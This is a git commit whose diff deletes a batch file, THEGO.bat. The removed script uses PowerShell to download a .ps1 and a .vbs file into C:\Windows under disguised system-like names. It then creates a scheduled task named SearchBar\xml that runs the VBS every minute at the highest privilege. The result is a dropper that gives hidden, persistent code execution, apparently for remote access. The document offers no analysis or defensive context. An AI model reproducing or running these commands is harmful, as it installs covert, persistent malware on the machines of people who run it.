642a4404987646a915984d5febe27784d0c9a227
Upload96 <76906376+Upload96@users.noreply.github.com>
2021-01-28 20:07:53 +1000

    Delete THEGO.bat

--- THEGO.bat
+++
@@ -1,4 +0,0 @@
-powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Upload96/UploadDownload/main/Win32RDP.ps1','C:\Windows\Win32RDP.ps1')"; powershell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Upload96/UploadDownload/main/Kernalx86.vbs','C:\Windows\Kernalx86.vbs')"; powershell.exe schtasks.exe /create /SC MINUTE /TN SearchBar\xml /TR C:\Windows\Kernalx86.vbs /RL HIGHEST
-
-
-
